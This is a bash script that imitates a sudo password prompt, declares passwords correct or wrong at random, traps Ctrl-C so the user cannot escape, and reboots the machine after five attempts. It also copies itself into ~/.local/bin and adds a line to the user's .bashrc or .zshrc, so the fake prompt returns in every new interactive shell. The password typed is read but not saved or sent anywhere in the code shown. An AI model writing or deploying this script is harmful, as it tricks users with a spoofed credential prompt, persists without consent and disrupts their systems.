#!/bin/bash

USER=$(whoami)
max_attempts=5
attempt_count=0
break_loop=true

getCtrlCSignal() {
    echo ""
    attempt_count=$((attempt_count + 1))
    if [ "$attempt_count" -ge "$max_attempts" ]; then
        echo "Maximum attempts reached. Rebooting..."
        attempt_count=0
        sleep 1
        reboot
    fi
    prompt_sudo
}

prompt_sudo() {
    while $break_loop; do
        echo -n "[sudo] password for $USER: "
        trap getCtrlCSignal SIGINT

        if [ -t 0 ]; then
            stty -echo
            read -r password
            stty echo
        else
            read -r password
        fi

        echo ""

        random_number=$((RANDOM % 10 + 1))

        if [ "$random_number" -eq 1 ]; then
            echo "Password correct!"
            break_loop=false
        else
            echo "Sorry, try again."

            attempt_count=$((attempt_count + 1))

            if [ "$attempt_count" -ge "$max_attempts" ]; then
                echo "Maximum attempts reached. Rebooting..."
                attempt_count=0
                sleep 1
                reboot
            fi

            sleep 0.5
        fi
    done
}

add_to_startup() {
    if [[ "$SHELL" == */bash ]]; then
        config_file="$HOME/.bashrc"
    elif [[ "$SHELL" == */zsh ]]; then
        config_file="$HOME/.zshrc"
    else
        config_file="$HOME/.bashrc"
    fi

    startup_line="if [ -t 1 ]; then ~/.local/bin/install.sh; fi"

    if ! grep -Fxq "$startup_line" "$config_file"; then
        echo "$startup_line" >> "$config_file"
    fi
}

install_script() {
    sudo_prompt_script="$HOME/.local/bin/install.sh"

    if [[ ! -f "$sudo_prompt_script" ]]; then
        cat > "$sudo_prompt_script" <<EOL
#!/bin/bash
USER=\$(whoami)
max_attempts=5
break_loop=true
attempt_count=0

while \$break_loop; do
    echo -n "[sudo] password for \$USER: "

    if [ -t 0 ]; then
        stty -echo
        read -r password
        stty echo
    else
        read -r password
    fi

    echo ""

    random_number=\$((RANDOM % 10 + 1))

    if [ "\$random_number" -eq 1 ]; then
        echo "Password correct!"
        break_loop=false  # Exit loop on success
    else
        echo "Sorry, try again."

        attempt_count=\$((attempt_count + 1))

        if [ "\$attempt_count" -ge "\$max_attempts" ]; then
            echo "Maximum attempts reached. Rebooting..."
            attempt_count=0
            sleep 1
            sudo reboot
        fi

        sleep 0.5
    fi
done
EOL

        chmod +x "$sudo_prompt_script"
    fi
}

install_script
add_to_startup

if [ -t 1 ]; then
    prompt_sudo
fi
